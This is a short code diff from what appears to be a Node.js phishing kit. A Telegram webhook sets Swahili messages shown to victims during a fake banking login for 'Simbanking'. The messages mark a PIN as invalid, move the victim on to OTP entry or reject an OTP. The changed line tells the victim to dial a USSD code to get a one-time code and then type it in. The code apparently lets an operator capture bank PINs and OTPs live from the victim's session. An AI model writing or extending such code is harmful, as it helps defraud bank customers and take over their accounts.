@@ -222,7 +222,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
         } else if (action === 'proceedotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP ya tarakimu 5.';
+          sessions[sessionId].notification = 'Nenda kwenye simu piga *150*03# kupata OTP. Nafasi ya kujaza itafunguka baada ya hapo.';
         } else if (action === 'wrongotp') {
           sessions[sessionId].status = 'enter_otp';
           sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 5.';
